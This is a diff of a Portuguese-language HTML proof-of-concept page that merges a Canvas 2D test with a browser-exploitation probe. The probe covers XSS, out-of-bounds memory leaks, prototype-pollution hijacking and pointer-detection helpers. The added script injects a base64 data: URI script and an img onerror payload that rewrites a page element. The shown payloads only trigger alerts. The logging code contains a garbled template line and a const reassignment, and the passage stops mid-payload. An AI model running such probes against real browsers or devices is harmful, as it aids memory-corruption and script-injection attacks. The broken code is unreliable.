@@ -2,175 +2,137 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Teste de Canvas v21.1 (Isolado - Debug)</title>
+    <title>PoC Combinado - PP Hijack JSON + Teste de Canvas</title>
     <style>
-        /* Estilos CSS */
+        /* Estilos CSS Originais (Script 1) + Canvas */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output-canvas { background: #222; border: 1px solid #444; padding: 10px; height: 40vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
-        .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-good { color: #4CAF50; } .log-vuln { color: #ff4444; font-weight: bold; }
+        /* Estilos de Log (Aplicáveis a ambos os outputs) */
+        .log-info { color: #6cf; }
+        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
+        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
+        .log-vuln { color: #ff4444; font-weight: bold; } /* Vermelho para vulnerabilidade confirmada */
+        .log-good { color: #4CAF50; } /* Verde para bloqueio esperado / falha */
+        .log-warn { color: #FFC107; }
+        .log-error { color: #f44336; }
+        .log-critical { color: #f0f; font-weight: bold; } /* Para mensagens críticas */
+        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks genéricos */
+        .log-ptr { color: #f0f; font-weight: bold; } /* Magenta para POTENCIAIS ponteiros */
+
+        /* Output Div Script 1 */
+        #output { background: #222; border: 1px solid #444; padding: 10px; height: 60vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
+        /* Target XSS Script 1 */
+        #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 40px; }
+
+        /* Output Div Script 2 (Canvas) */
+        #output-canvas { background: #2a2a2a; border: 1px solid #444; padding: 10px; height: 40vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
+        /* Canvas Element Script 2 */
         #interactive-canvas { display: block; border: 1px solid #444; margin-top: 5px; cursor: crosshair; background-color: #333; }
+        /* Status Div Canvas Script 2 */
         #canvas-coord-status { color: #aaa; font-size: 12px; height: 15px; }
+
+        hr { border: 1px solid #555; margin: 20px 0; }
     </style>
 </head>
 <body>
-    <h1>Teste de Canvas v21.1 (Isolado - Debug)</h1>
-    <p>Teste isolado de Canvas 2D com mais logs e verificações.</p>
-    <canvas id="interactive-canvas" width="350" height="200"></canvas>
-    <div id="canvas-coord-status">Passe o mouse sobre o canvas ↑</div>
-    <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste de Canvas</button>
-    <div id="output-canvas"></div> <script>
-        // --- Setup Canvas Test ---
-        // Variáveis globais para elementos, inicializadas como null
-        let canvasOutputDiv = null;
-        let canvasRunBtn = null;
-        let canvasElement = null;
-        let coordStatusDivCanvas = null;
-        let ctx = null; // Contexto global para fácil acesso
+    <h1>PoC Combinado - PP Hijack JSON + Teste de Canvas</h1>
 
-        const SHORT_PAUSE_CANVAS = 50;
-        const MEDIUM_PAUSE_CANVAS = 300;
-        let canvasClickListenerCanvas = null;
-        let canvasMoveListenerCanvas = null;
-        const rectAreaCanvas = { x: 10, y: 10, w: 50, h: 50 };
-        const linkAreaCanvas = { x: 150, y: 100, w: 80, h: 30 };
+    <section>
+        <h2>(Script 1: PP Hijack JSON)</h2>
+        <p>Testa: XSS, OOB R/W (Info Leak), PP Básica, PP Hijack (JSON.stringify com Interação).</p>
+        <button id="runBtn" onclick="runAllTests()">Iniciar Testes PP/OOB/XSS</button>
+        <div id="output"></div>
+        <div id="xss-target-div">Área para teste de XSS DOM (Script 1).</div>
+    </section>
 
-        // --- Função de Log (Mais Robusta) ---
-        const logCanvas = (message, type = 'info') => {
-             // Log no console sempre, para o caso do DIV falhar
-             console.log(`[${type.toUpperCase()}] ${message}`);
-             if (!canvasOutputDiv) {
-                 console.error("logCanvas ERRO: output-canvas DIV não encontrado!");
-                 return;
-             }
-             try {
-                 const timestamp = `[${new Date().toLocaleTimeString()}]`;
-                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                 // Limite de log
-                 if(canvasOutputDiv.innerHTML.length > 500000){
-                     canvasOutputDiv.innerHTML = canvasOutputDiv.innerHTML.substring(canvasOutputDiv.innerHTML.length - 250000);
-                     canvasOutputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + canvasOutputDiv.innerHTML;
-                 }
-                 canvasOutputDiv.innerHTML += `<span class="log-${type}">${timestamp} ${sanitizedMessage}\n</span>`;
-                 canvasOutputDiv.scrollTop = canvasOutputDiv.scrollHeight;
-             } catch(e) {
-                 // Loga erro no console se falhar em escrever no DIV
-                 console.error("logCanvas ERRO ao escrever no DIV:", e);
-             }
-        };
+    <hr>
 
-         // --- Helper toHex (Opcional, mas pode ser útil) ---
-         const toHex = (val, bits = 32) => { try { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); } catch { return 'Error'; } };
+    <section>
+        <h2>(Script 2: Teste de Canvas v21.1 Isolado)</h2>
+        <p>Teste isolado de Canvas 2D com mais logs e verificações.</p>
+        <canvas id="interactive-canvas" width="350" height="200"></canvas>
+        <div id="canvas-coord-status">Passe o mouse sobre o canvas ↑</div>
+        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste de Canvas</button>
+        <div id="output-canvas"></div>
+    </section>
 
-        // --- Função Principal do Teste de Canvas ---
-        const testComprehensiveCanvasIsolated = async () => {
-            logCanvas("--- Iniciando Teste Isolado de Canvas ---", 'test');
+    <script>
+        // --- Script 1 Original Inteiro ---
+        const outputDiv = document.getElementById('output'); // Usa #output
+        const runBtn = document.getElementById('runBtn');
+        const SHORT_PAUSE = 50; // ms
+        const MEDIUM_PAUSE = 500; // ms
+        let leakedValueFromOOB = null; // Armazena valor do Info Leak (Escopo Global)
+
+        const log = (message, type = 'info') => { // Função de log para Script 1
+            if (!outputDiv) return;
             try {
-                // Verifica se o contexto já foi obtido (evita erro se chamado múltiplas vezes)
-                if (!ctx) {
-                    if (!canvasElement) throw new Error('Elemento Canvas é null');
-                    ctx = canvasElement.getContext('2d');
-                    if (!ctx) throw new Error('Contexto 2D não disponível');
-                    logCanvas("Contexto Canvas 2D obtido pela primeira vez.", 'info');
-                } else {
-                    logCanvas("Contexto Canvas 2D já existente.", 'info');
+                const timestamp = `[${new Date().toLocaleTimeString()}]`;
+                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                if(outputDiv.innerHTML.length > 500000){
+                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000);
+                    outputDiv.innerHTML = `<span class="log-info">[Log Truncado...]</span>\n` + outputDiv.innerHTML; // Usar info para não assustar
                 }
+                // Adicionada classe 'critical' se não existir
+                const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical'].includes(type) ? type : 'info';
+                 outputDiv.innerHTML += `<span class="log-<span class="math-inline">\{logClass\}"\></span>{timestamp} ${sanitizedMessage}\n</span>`;
+                 outputDiv.scrollTop = outputDiv.scrollHeight;
+             } catch(e) { console.error("Erro na função log (Script 1):", e); outputDiv = null; }
+         };
 
-                // Limpa e desenha fundo
-                ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);
-                ctx.fillStyle = "#334"; // Fundo diferente
-                ctx.fillRect(0, 0, canvasElement.width, canvasElement.height);
-                logCanvas("Canvas limpo e fundo desenhado.", 'info');
-
-            } catch(e) {
-                logCanvas(`Falha CRÍTICA no setup do Canvas: ${e.message}`, 'error');
-                logCanvas("--- Teste de Canvas Isolado ABORTADO (Setup) ---", 'test');
-                if (canvasRunBtn) canvasRunBtn.disabled = false; // Reabilita botão se falhar aqui
-                return; // Aborta o resto do teste
-            }
-
-            // 1. Desenho
-            logCanvas("Desenhando formas...", 'subtest');
-            await new Promise(r => setTimeout(r, SHORT_PAUSE_CANVAS));
-            try {
-                ctx.fillStyle="#FF5733"; ctx.fillRect(rectAreaCanvas.x, rectAreaCanvas.y, rectAreaCanvas.w, rectAreaCanvas.h); // Laranja
-                ctx.fillStyle="#33FF57"; ctx.beginPath(); ctx.arc(120, 50, 30, 0, 2*Math.PI); ctx.fill(); // Verde
-                ctx.fillStyle="rgba(50, 150, 255, 0.7)"; ctx.fillRect(linkAreaCanvas.x, linkAreaCanvas.y, linkAreaCanvas.w, linkAreaCanvas.h); // Azul Transp
-                ctx.fillStyle="#FFFFFF"; ctx.font="bold 14px monospace"; ctx.textAlign="center";
-                ctx.fillText("Abrir Link", linkAreaCanvas.x + linkAreaCanvas.w / 2, linkAreaCanvas.y + linkAreaCanvas.h / 2 + 5);
-                ctx.textAlign="start";
-                logCanvas("Formas desenhadas.", 'good');
-            } catch(e) { logCanvas(`Erro durante desenho: ${e.message}`, 'error'); }
-
-            // 2. Teste de APIs e Quirks
-            logCanvas("Verificando APIs e Quirks...", 'subtest');
-            await new Promise(r => setTimeout(r, SHORT_PAUSE_CANVAS));
-            try {
-                const filterSupported = typeof ctx.filter !== 'undefined';
-                logCanvas(` API Filter Suportado: ${filterSupported}`, filterSupported ? 'info' : 'warn');
-                const pngURL = canvasElement.toDataURL('image/png');
-                const jpegURL = canvasElement.toDataURL('image/jpeg');
-                const urlQuirk = pngURL.length === jpegURL.length || pngURL.substring(30,70) === jpegURL.substring(30,70);
-                logCanvas(` toDataURL PNG(len ${pngURL.length}) / JPEG(len ${jpegURL.length}). Quirk: ${urlQuirk}`, urlQuirk ? 'warn' : 'info');
-                logCanvas(` API ellipse: ${typeof ctx.ellipse==='function'}`, 'info');
-                logCanvas(` API measureText: ${typeof ctx.measureText==='function'}`, 'info');
-                if (typeof ctx.measureText==='function') { logCanvas(`  measureText('Test😊'): width ${ctx.measureText('Test😊').width.toFixed(1)}`, 'info');}
-            } catch(e) { logCanvas(` Erro API Check: ${e.message}`, 'error'); }
-
-            // 3. Interatividade
-            logCanvas("Adicionando listeners 'click' e 'mousemove'...", 'subtest');
-            await new Promise(r => setTimeout(r, SHORT_PAUSE_CANVAS));
-            if(canvasClickListenerCanvas && canvasElement) { try { canvasElement.removeEventListener('click', canvasClickListenerCanvas); } catch(e){} }
-            if(canvasMoveListenerCanvas && canvasElement) { try { canvasElement.removeEventListener('mousemove', canvasMoveListenerCanvas); } catch(e){} }
-
-            canvasClickListenerCanvas = (event) => { /* ... (lógica click v19, usando logCanvas) ... */ try{const r=canvasElement.getBoundingClientRect();const x=event.clientX-r.left; const y=event.clientY-r.top; let area='fora';if(x>=rectAreaCanvas.x&&x<=rectAreaCanvas.x+rectAreaCanvas.w&&y>=rectAreaCanvas.y&&y<=rectAreaCanvas.y+rectAreaCanvas.h)area='Rect Laranja'; else if(x>=linkAreaCanvas.x&&x<=linkAreaCanvas.x+linkAreaCanvas.w&&y>=linkAreaCanvas.y&&y<=linkAreaCanvas.y+linkAreaCanvas.h)area='Área Link'; logCanvas(`--> Click! Area: ${area}. Coords: x=${x.toFixed(0)}, y=${y.toFixed(0)}`,'warn'); if(area==='Área Link'){logCanvas("--> Ação LINK: Tentando abrir google.com...",'vuln'); try{window.open('https://google.com','_blank');}catch(e){logCanvas('Erro ao abrir link (bloqueado?): '+e.message,'error');}}}catch(e){logCanvas(`Erro click handler: ${e.message}`,'error');} };
-            canvasMoveListenerCanvas = (event) => { /* ... (lógica move v19, usando coordStatusDivCanvas) ... */ try{const r=canvasElement.getBoundingClientRect();const x=event.clientX-r.left; const y=event.clientY-r.top; if(coordStatusDivCanvas) coordStatusDivCanvas.textContent = `Canvas Coords: X=${x.toFixed(0)}, Y=${y.toFixed(0)}`;}catch(e){} };
-
-            try { canvasElement.addEventListener('click', canvasClickListenerCanvas); canvasElement.addEventListener('mousemove', canvasMoveListenerCanvas); logCanvas("Listeners adicionados. TESTE CLICANDO E MOVENDO O MOUSE NO CANVAS!", 'good'); }
-            catch (e) { logCanvas(`Erro add listeners: ${e.message}`, 'error'); }
-
-            logCanvas("--- Teste de Canvas Isolado Concluído ---", 'test');
-            if (canvasRunBtn) canvasRunBtn.disabled = false; // Reabilita botão no final
-        };
-
-        // --- Função chamada pelo botão ---
-        const runCanvasTest = async () => {
-            logCanvas("Botão 'Iniciar Teste de Canvas' clicado.", "info");
-            if (canvasRunBtn) canvasRunBtn.disabled = true;
-            // Garante que os elementos globais foram pegos antes de rodar
-             if (!canvasOutputDiv || !canvasRunBtn || !canvasElement || !coordStatusDivCanvas) {
-                 logCanvas("ERRO FATAL: Elementos HTML essenciais não encontrados no carregamento.", "error");
-                 if (canvasRunBtn) canvasRunBtn.disabled = false;
-                 return;
-             }
-            await testComprehensiveCanvasIsolated();
-            // O botão é reabilitado dentro do testComprehensiveCanvasIsolated se ele completar
-        };
-
-         // --- Inicialização e Limpeza ---
-         // Pega referências aos elementos assim que o script carrega
-         try {
-             canvasOutputDiv = document.getElementById('output-canvas');
-             canvasRunBtn = document.getElementById('runCanvasBtn');
-             canvasElement = document.getElementById('interactive-canvas');
-             coordStatusDivCanvas = document.getElementById('canvas-coord-status');
-             if (!canvasOutputDiv || !canvasRunBtn || !canvasElement || !coordStatusDivCanvas) {
-                console.error("Falha ao obter todos os elementos HTML necessários na carga inicial!");
-                // Logar no body se o outputDiv falhar?
-                if (!outputDiv) document.body.innerHTML += '<p style="color:red;">ERRO: Falha ao obter DIV de output!</p>';
-             } else {
-                 console.log("Elementos HTML para Teste de Canvas encontrados.");
-             }
-         } catch (e) {
-             console.error("Erro crítico durante setup inicial:", e);
-             alert("Erro crítico no setup inicial, veja o console (F12).");
+         const toHex = (val, bits = 32) => { // toHex do Script 1
+            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
+            let num = Number(val);
+            if (bits <= 32) { num = num >>> 0; }
+            const pad = Math.ceil(bits / 4);
+            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
          }
 
-         // Limpeza listeners ao sair
-         window.addEventListener('unload', () => { if(canvasClickListenerCanvas && canvasElement) canvasElement.removeEventListener('click',canvasClickListenerCanvas); if(canvasMoveListenerCanvas && canvasElement) canvasElement.removeEventListener('mousemove',canvasMoveListenerCanvas); });
-         // document.addEventListener('DOMContentLoaded', runCanvasTest); // Para rodar auto
+         const isPotentialPointer64 = (high, low) => {
+             if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
+             if (high === 0 && low === 0) return false;
+             if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
+             if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Padrões comuns de preenchimento
+             if (high === 0 && low < 0x100000) return false; // Endereços muito baixos
+             return true;
+         };
 
-    </script>
+         const isPotentialData32 = (val) => {
+             if (val === null || typeof val !== 'number') return false;
+             val = val >>> 0;
+             if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; // Padrões comuns
+             if (val < 0x1000) return false; // Valores muito pequenos
+             return true;
+         }
 
-</body>
-</html>
+         const testCSPBypass = async () => {
+             log("--- Iniciando Teste 1: CSP Bypass / XSS ---", 'test');
+             log("Tentando XSS via data: URI (alert)...", 'subtest');
+             await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
+             try {
+                 // Payload chama log() dentro dele para confirmar execução interna
+                 const payloadJS = `try { alert('XSS via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln"); } catch(e) { console.error('Data URI Payload Error:', e); log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good"); }`;
+                 const encodedPayload = btoa(payloadJS);
+                 const scriptTag = document.createElement('script');
+                 scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
+                 scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: URI! (CSP ou outro erro)", 'error'); };
+                 document.body.appendChild(scriptTag);
+                 log("Tag <script> data: URI adicionada.", 'info');
+             } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error'); }
+
+             await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2)); // Pausa maior para alert
+
+             log("Tentando XSS DOM via inline handler (onerror)...", 'subtest');
+             await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
+             try {
+                 const imgTag = document.createElement('img');
+                 imgTag.src = 'invalid_image_source_' + Date.now();
+                 // Payload do onerror também chama log()
+                 const onerrorPayload = `
+                     try {
+                         const target = document.getElementById('xss-target-div');
+                         if (target) {
+                             target.innerHTML = '<h2 class="log-vuln">XSS DOM via ONERROR Executado!</h2>';
+                             log("XSS DOM via onerror realizado!", "vuln"); // Loga sucesso aqui
+                         } else { log("Alvo XSS DOM (onerror) não encontrado.", "error"); }
+                         alert('XSS_DOM_ONERROR'); // Mantém o alert para confirmação visual
+                     } catch(e) { console.error('Onerror Payload Error:', e); log("
